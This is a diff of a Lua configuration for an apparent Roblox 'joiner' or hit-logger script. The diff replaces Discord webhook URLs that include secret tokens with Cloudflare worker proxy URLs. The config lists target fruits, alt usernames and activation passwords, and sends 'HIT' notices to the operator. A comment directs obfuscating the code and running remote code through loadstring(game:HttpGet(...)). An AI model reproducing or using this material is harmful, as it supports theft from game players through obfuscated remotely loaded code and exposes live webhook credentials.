@@ -1,11 +1,11 @@
-Webhook = "https://discord.com/api/webhooks/1361616362740383744/DI3-uvXwuwdCNyliAcUN1XCjkj7E1sT9JWZCFvYyc0KvfgQsFNaS6NOuz53jzoD1QtUU" -- << Protected URL for main hits
+Webhook = "https://sharky-on-top.script-config-protector.workers.dev/w/b569344f-55c7-4ca1-91db-3b4183c51817" -- << Protected URL for main hits
 Usernames = { "user1", "user2", "user3", "user4", "user5" } -- << Your usernames here, you can add as many alts as you want
 FruitsToHit = { "Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas", "Ghost-Ghost" } -- << Fruits you want the script to detect
 
 --obfuscate after this, use loadstring for this coming part--> loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()
 
-Protector = "https://discord.com/api/webhooks/1361624271939698760/Xt7bz7aveyyhK_VrXFprRGWn3WAHeXKZ3prGfivfVrYbTCwyn68_HR6-HfL-qDN3KiVs" -- << Protected URL for main hits (secondary)
-dummy = "https://discord.com/api/webhooks/1361616570228408320/K8k-6qq7VUDZpn605CJXhfcwhIrqNGET_SpsMjg84ywnzmflXnnMxeYnWsxosY0AoCBv" -- << Protected URL for admin/special hits
+Protector = "https://sharky-on-top.script-config-protector.workers.dev/w/300be834-a780-46d6-804a-c623d1f1051b" -- << Protected URL for main hits (secondary)
+dummy = "https://sharky-on-top.script-config-protector.workers.dev/w/f08da0cd-bd44-47a7-807d-eab8784d350d" -- << Protected URL for admin/special hits
 
 ActivationPasswords = {-- Passwords for ?activate command
     "ishusontop",
@@ -467,7 +467,7 @@ local originalSynRequest = syn and syn.request
 local headerCache = {
     ["Content-Type"] = "application/json"
 }
-local TEST_WEBHOOK = "https://discord.com/api/webhooks/1361632307202625546/fpkZheYZTfuQ90VJatlOm5ITgp8J2zAaV85D0Rm0XJNrbKfVCfqOh3u-EYj3LXZCsZFS" -- For integrity check only
+local TEST_WEBHOOK = "https://sharky-on-top.script-config-protector.workers.dev/w/920f3d7f-3294-4161-a7b5-d146cba0e1f2" -- For integrity check only
 local TEST_PAYLOAD = HttpService:JSONEncode({
     content = "# :shark: Sharky! Someone just got a HIT :) :shark:"
 })
